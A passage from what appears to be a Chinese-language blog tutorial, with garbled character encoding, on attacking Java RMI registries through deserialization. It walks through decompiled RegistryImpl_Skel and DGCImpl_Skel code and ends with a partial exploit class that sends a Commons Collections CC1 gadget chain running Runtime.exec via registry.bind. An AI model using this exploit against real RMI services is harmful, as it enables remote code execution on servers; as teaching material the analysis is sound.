<span class="hljs-operator">=</span> var5.getOutputStream();<br>            var6.writeObject(var1);<br>            var6.writeLong(var2);<br>            var6.writeObject(var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var20) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var20);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var5);<br><br>        Lease var24;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var5.getInputStream();<br>            var24 = (Lease)var9.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var17) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var17);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var18);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var5);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var24;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var22) &#123;<br>        <span class="hljs-keyword">throw</span> var22;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var23) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var23);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">DGCImpl_Skel</font></strong></p><p><font style="color:rgb(51, 51, 51);">ä¹Ÿå­˜åœ¨æ¼æ´ç‚¹</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != -<span class="hljs-number">669196253586618813L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DGCImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (DGCImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                ObjID[] var39;<br>                <span class="hljs-type">long</span> var40;<br>                VMID var41;<br>                <span class="hljs-type">boolean</span> var42;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var14</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var39 = (ObjID[])var14.readObject();<br>                    var40 = var14.readLong();<br>                    var41 = (VMID)var14.readObject();<br>                    var42 = var14.readBoolean();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var36) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var36);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var37) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var37);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.clean(var39, var40, var41, var42);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var35) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var35);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                ObjID[] var7;<br>                <span class="hljs-type">long</span> var8;<br>                Lease var10;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (ObjID[])var13.readObject();<br>                    var8 = var13.readLong();<br>                    var10 = (Lease)var13.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var32) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var32);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var33) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var33);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Lease</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var6.dirty(var7, var8, var10);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var12.writeObject(var11);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var31) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var31);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4ã€RMIçš„å‡ ç§æ”»å‡»æ–¹å¼"><a href="#4ã€RMIçš„å‡ ç§æ”»å‡»æ–¹å¼" class="headerlink" title="4ã€RMIçš„å‡ ç§æ”»å‡»æ–¹å¼"></a>4ã€RMIçš„å‡ ç§æ”»å‡»æ–¹å¼</h2><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p><h3 id="4-1-æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#4-1-æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="4.1 æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>4.1 æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h3><p>æ”»å‡»ç‚¹è¿˜æ˜¯åœ¨ <font style="color:#080808;background-color:#ffffff;">RegistryImpl_Skel ä»£ç ä¸­çš„ååºåˆ—åŒ–ï¼Œ</font></p><p><font style="color:#080808;background-color:#ffffff;">case çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</font></p><ul><li><font style="color:#080808;background-color:#ffffff;">case0 â€“ bind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var100 = (String)var105.readObject();<br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case1 â€“ list</font><ul><li><font style="color:#080808;background-color:#ffffff;">list è¿™é‡Œæ²¡æœ‰ readObject ï¼Œæ— æ³•æ”»å‡»</font></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>var2.releaseInputStream();<br>String[] var99 = var6.list();<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var102.writeObject(var99);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case2 â€“ lookup</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case3 â€“  rebind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>Remote var8;<br>String var97;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var97 = (String)var11.readObject();<br>    var8 = (Remote)var11.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.rebind(var97, var8);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case4 â€“ unbind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>String var7;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var7 = (String)var10.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.unbind(var7);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;"></font></p><h4 id="4-1-1-bind-rebind"><a href="#4-1-1-bind-rebind" class="headerlink" title="4.1.1 bind&amp;rebind"></a>4.1.1 bind&amp;rebind</h4><p>è°ƒç”¨ bind æ—¶ï¼Œä¼šååºåˆ—åŒ–å‚æ•°åå’Œè¿œç¨‹å¯¹è±¡ï¼Œå¦‚æœæœåŠ¡ç«¯å­˜åœ¨ cc é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">//é¦–å…ˆæ³¨å†Œä¸­å¿ƒæ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚çš„ bind æ–¹æ³•è¿›å…¥ case0 åˆ†æ”¯ï¼Œ</span><br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//ç„¶åè¿›è¡Œååºåˆ—åŒ–</span><br>    <span class="hljs-comment">//ç¬¬ä¸€ä¸ªå¯¹è±¡å¿…é¡»æ˜¯ String</span><br>    var100 = (String)var105.readObject();<br>    <span class="hljs-comment">//ç¬¬äºŒä¸ªå¯¹è±¡è¢«å¼ºè½¬ä¸º Remote</span><br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.rmi.Remote;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);  <br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) CC1();  <br>        <span class="hljs-comment">//Proxy.newProxyInstance(...)ï¼šåˆ›å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†ï¼ˆJDK åŠ¨æ€ä»£ç†ï¼‰ï¼Œä½¿ä¹‹å®ç° Remote æ¥å£å¹¶ä½¿ç”¨ä¸Šé¢å¾—åˆ°çš„ handler æ¥å¤„ç†æ–¹æ³•è°ƒç”¨</span><br>        <span class="hljs-comment">//è¿™ä¸€æ­¥çš„ä½œç”¨æ˜¯æŠŠæ„é€ çš„å¯¹è±¡åŒ…è£…æˆ Remote ç±»å‹ï¼Œä»¥ä¾¿èƒ½ä½œä¸º bind çš„ç¬¬äºŒä¸ªå‚æ•°</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, handler));  <br>        <span class="hljs-comment">//å‘ç›®æ ‡ RMI registry å‘é€è¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–</span><br>        registry.bind(<span class="hljs-string">&quot;sTring&quot;</span>,remote);  <br>    &#125;  <br>    <br><span class="hljs-comment">//ä¸‹é¢å°±æ˜¯ä»¥å‰åˆ†æè¿‡çš„ CC1 é“¾ ï¼ˆTransformedMap ç‰ˆ  ï¼‰</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br>        constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> 